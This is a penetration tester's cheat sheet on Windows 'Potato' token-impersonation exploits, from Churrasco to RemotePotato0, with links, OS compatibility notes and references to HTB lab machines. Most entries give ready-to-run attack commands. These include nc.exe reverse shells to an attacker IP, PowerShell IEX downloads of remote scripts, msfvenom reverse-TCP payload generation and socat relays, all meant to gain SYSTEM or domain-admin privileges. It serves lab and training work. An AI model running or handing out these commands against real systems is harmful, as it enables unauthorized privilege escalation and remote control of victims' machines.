Potato Exploits:
===============
Basics:
	Churrasco->Hot-Potato->Tater->RottenPotato->RottenPotatoNG->LonelyPotato->JuicyPotato->LovelyPotato->CandyPotato->RoguePotato->SweetPotato->JuicyPotato_2->RemotePotato0
Churrasco:(https://github.com/Re4son/Churrasco)
	Basics:
		Churrasco can be considered the 1st potato exploit. 
		Compatibility:
			Windows server 2003
		Used in HTB::Grandpa
	Usage:
		churrasco.exe -d "C:\WINDOWS\Temp\nc32.exe -e CMD.exe 10.10.14.147 4444"
		Flags:
			-d => 
HotPotato:(https://github.com/foxglovesec/Potato)
	Basics:
		Compatibility:
			Windows 7/8/10
			Windows Server 2008/2012
	Usage:
		Note:
			No longer in use
Tater:(https://github.com/Kevin-Robertson/Tater)
	Basics:
		Tater is a Powershell implementation of the HotPotato.
	Usage:
		Note:
			No longer in use
RottenPotato:(https://github.com/foxglovesec/RottenPotato)
	Basics:
		RottenPotato is also available in metasploit as 'ms16_075_reflection'.
	Usage:
		Note:
			No longer in use, github page says "This code is no longer maintained, so shift to RottenPotatoNG".
RottenPotatoNG:(https://github.com/breenmachine/RottenPotatoNG)
	Basics:
		RottenPotatoNG is version2 of RottenPotato, and relies on meterpreter.
	Usage:
		After having a meterpreter shell with incognito mode loaded:
			MSFRottenPotato.exe t c:\windows\temp\test.bat
LonelyPotato:(https://github.com/decoder-it/lonelypotato)
	Basics:
		LonelyPotato is adaptation of RottenPotato without relying on meterpreter and the “incognito” module
	Usage:	
		Note:
			No longer in use. The github page says "Shift to JuicyPotato"
JuicyPotato:(https://github.com/ohpe/juicy-potato/releases)
	Basics:
		JuicyPotato is 'sugared version'(better version) of RottenPotatoNG.
		JuicyPotato is also available in metasploit as 'ms16_075_reflection_juicy'.
		Compatibility:
			Machine < Windows 10 1809
			Machine < Windows Server 2019
		Used in HTB::jevees
	Usage:
		JuicyPotato.exe -l lport -p c:\windows\system32\CMD.exe -a "/c c:\users\public\desktop\nc.exe -e CMD.exe lhost lport" -t * :
			to use nc.exe
		JuicyPotato.exe -l lport -p c:\windows\system32\CMD.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://lhost:8080/rev.ps1')" -t * :
			to use ps reverse shell
		Note:
			if shell.exe dont work "access is denied", then try to use shell.ps1
		Flags:
			-l lport => any port
			-p c:\windows\system32\CMD.exe
				we always use "\system32\CMD.exe" is SYSTEM shell
			-a "arguments to pass to program(-p)"
				example:
					-a "/c c:\users\public\desktop\nc.exe -e CMD.exe lhost lport"
			-t *
				it defines createprocess call:
					t => CreateProcessWithTokenW
					u => CreateProcessAsUser
					* => both
			-c {clsid}:
				https://ohpe.it/juicy-potato/CLSID/ => list of clsids based on OS
				default => {4991d34b-80a1-4291-83b6-3328366b9097}
			Optional Flags:
				-m <ip>: COM server listen address (default 127.0.0.1)
				-k <ip>: RPC server ip address (default 127.0.0.1)
				-n <port>: RPC server listen port (default 135)
				-z only test CLSID and print token's user
	Note:
		Use LovelyPotato as it Automates the process.
LovelyPotato:(https://github.com/TsukiCTF/Lovely-Potato)
	Basics:
		LovelyPotato is powershell implementation of JuicyPotato.
		Why Use Lovely Potato:
			For simplicity. Manually uploading various files to target host can be easily avoided with automation. Also, listing entire CLSIDs on the system and identifying privilege for each of them takes very long time if done by sending commands. You can easily switch binaries in the repo any time without having to recode Invoke-LovelyPotato.ps1. Ex) Recompiling JuicyPotato for customization / Obfuscating your meterpreter for AV evasion
	Usage:
		Modify the two following variables in 'Invoke-LovelyPotato.ps1':
			$RemoteDir = "http://[AttackerIP]
			$LocalPath = "[WritablePathOnVictimMachine]"
				any path in which we can write files
				C:\>mkdir temp2
		Create a payload:
			msfvenom -p windows/shell_reverse_tcp LHOST=[AttackerIP] LPORT=[AttackerPort] -f exe -o meterpreter.exe
			 	Note: name must be meterpreter.exe
		python3 -m http.server 80
		nc -nvlp 4444
		On the initial shell:
			IEX(New-Object Net.WebClient).DownloadString('http://[AttackerIP]/Invoke-LovelyPotato.ps1')
	Note:
		This exploit takes roughly 10-20 mins to run, so dont panic and just wait.
		we can track progress as follows:
			go to the directory($LocalPath mentioned in Invoke-LovelyPotato.ps1):
				type result.log
CandyPotato:(https://github.com/klezVirus/CandyPotato)
	Basics:
		CandyPotato is same as JuicyPotato, but with few extra features.
		Compatibility:
			Machine < Windows 8.1
			Machine < Windows Server 2016
	Usage:
		Flags:
RoguePotato:(https://github.com/antonioCoco/RoguePotato)
	Basics:
		Released on 11 may 2020
		Compatibility:
			Machine >= Windows 10 1809
			Machine >= Windows Server 2019
		Used in HTB::Remote,HTB::Worker
	Usage:(3 Steps)
		Step-1: socat tcp-listen:135,reuseaddr,fork tcp:ip_of_target:9999
		Step-2: .\RoguePotato.exe -r my_ip -e "powershell -c IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.7/shell2.ps1')" -l 9999
			Flags:
				-r => lhost
				-e => program
				-l => lport
				-c {clsid} => CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
		Step-3: nc -nlp 443
SweetPotato:(https://github.com/CCob/SweetPotato)
	Basics:
		Released on 13 may 2020
		The tool was designed to be used with Cobalt Strike’s execute-assembly command, so it carries no baggage in the form of dependencies
	Usage:
		Flags:
			-c => --clsid=x => CLSID (default BITS: 4991D34B-80A1-4291-83B6-3328366B9097)
			-m => --method=x => Auto,User,Thread (default Auto)
			-p => --prog=x => Program to launch (default CMD.exe)
			-a => --args=x => Arguments for program (default null)
			-e => --exploit=x => Exploit mode [DCOM|WinRM|PrintSpoofer(default)]
			-l => --listenPortx => COM server listen port (default 6666)
JuicyPotato_2:(https://github.com/decoder-it/juicy_2)
	Basics:
		Released on 30 may 2020
		Compatibility:
			Machine > Win10 build 1803
			Machine = Win Server 2019
	IDK the difference between juicy2 and RoguePotato, consider the following links:
		https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html
		https://2020.romhack.io/dl-2020/RH2020-slides-Cocomazzi.pdf
RemotePotato0:(https://github.com/antonioCoco/RemotePotato0)
	Basics:
		Released on 26 April 2021
		RemotePotato0 is an exploit that allows you to escalate your privileges from a generic User to Domain Admin.
		Requirements:
			1. A user with Domain Administrator privileges is physically logged into the host or via Remote Desktop
			2. The attacker has gained initial access to the host or has access via WinRM or SSH
			3. LDAP and SMB Signing not to be configured
	Usage: